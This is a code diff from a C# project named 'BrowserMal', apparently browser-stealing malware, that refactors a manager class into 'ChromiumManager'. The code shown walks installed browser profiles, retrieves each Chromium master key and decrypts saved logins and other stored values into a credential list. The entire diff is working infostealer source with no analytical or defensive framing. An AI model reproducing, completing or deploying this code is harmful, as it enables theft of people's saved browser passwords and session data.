@@ -1,5 +1,4 @@
-﻿using BrowserMal.AES;
-using BrowserMal.Browser;
+﻿using BrowserMal.Browser;
 using BrowserMal.Filesaver;
 using BrowserMal.Util;
 using System;
@@ -7,20 +6,21 @@ using System.Collections.Generic;
 using System.IO;
 using BrowserMal.SQLite;
 using BrowserMal.Model;
+using BrowserMal.Encryption;
 
 namespace BrowserMal.Manager
 {
-    public class GenericManager<T>
+    public class ChromiumManager<T>
     {
         private readonly string tableName;
         private readonly SqliteTableModel sqliteTableModel;
         private readonly Dictionary<string, string> resultList;
 
-        public GenericManager(string tableName, SqliteTableModel sqliteTableModel)
+        public ChromiumManager(string tableName, SqliteTableModel sqliteTableModel)
         {
             this.tableName = tableName;
             this.sqliteTableModel = sqliteTableModel;
-            this.resultList = new Dictionary<string, string>();
+            resultList = new Dictionary<string, string>();
         }
 
         public Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType)
@@ -32,7 +32,7 @@ namespace BrowserMal.Manager
                     if (!Directory.Exists(browser.Location))
                         continue;
 
-                    byte[] key = AesGcm256.GetMasterKey(browser.Location);
+                    byte[] key = ChromiumDecryption.GetMasterKey(browser.Location);
 
                     if (key == null)
                         continue;
@@ -63,7 +63,7 @@ namespace BrowserMal.Manager
                     if (!Directory.Exists(browser.Location))
                         continue;
 
-                    byte[] key = AesGcm256.GetMasterKey(browser.Location);
+                    byte[] key = ChromiumDecryption.GetMasterKey(browser.Location);
 
                     if (key == null)
                         continue;
@@ -84,7 +84,7 @@ namespace BrowserMal.Manager
 
         private List<T> GetLogins(string path, byte[] masterKey, string profileType)
         {
-            List<string> profiles = Browser.Util.GetAllProfiles(path, profileType);
+            List<string> profiles = Browser.ChromiumUtil.GetAllProfiles(path, profileType);
             List<T> creds = new List<T>();
 
             foreach (string profile in profiles)
@@ -157,7 +157,7 @@ namespace BrowserMal.Manager
 
         private string DecodeValue(bool isEncrypted, string outputValue, byte[] masterKey)
         {
-            return (isEncrypted) ? AesGcm256.GetEncryptedValue(outputValue, masterKey) : outputValue;
+            return (isEncrypted) ? ChromiumDecryption.GetEncryptedValue(outputValue, masterKey) : outputValue;
         }
     }
 }
